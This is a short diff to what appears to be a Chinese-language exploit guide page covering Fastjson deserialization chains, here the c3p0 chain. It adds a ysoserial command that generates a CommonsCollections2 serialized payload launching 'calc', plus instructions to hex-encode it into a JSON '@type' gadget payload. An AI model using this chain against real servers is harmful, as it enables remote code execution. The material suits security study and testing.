@@ -286,7 +286,9 @@
 }</code></pre>
     <h3>3、c3p0链</h3>
     <p>条件：依赖包</p>
-    <p>使用jdk1.8.0_65的javac exp.java生成exp.class，再把exp.class转换为hex值</p>
+    <p>生成一个弹计算机的命令的文件：
+d:\jdk-1.8\bin\java.exe -jar ysoserial.jar CommonsCollections2 "calc" > calc.ser</p>
+<p>根据上面生成的calc.ser文件使用项目转成hex值替换下面的HEX值执行即可</p>
     <pre><code>{
     "@type": "java.lang.Class",
     "val": "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"
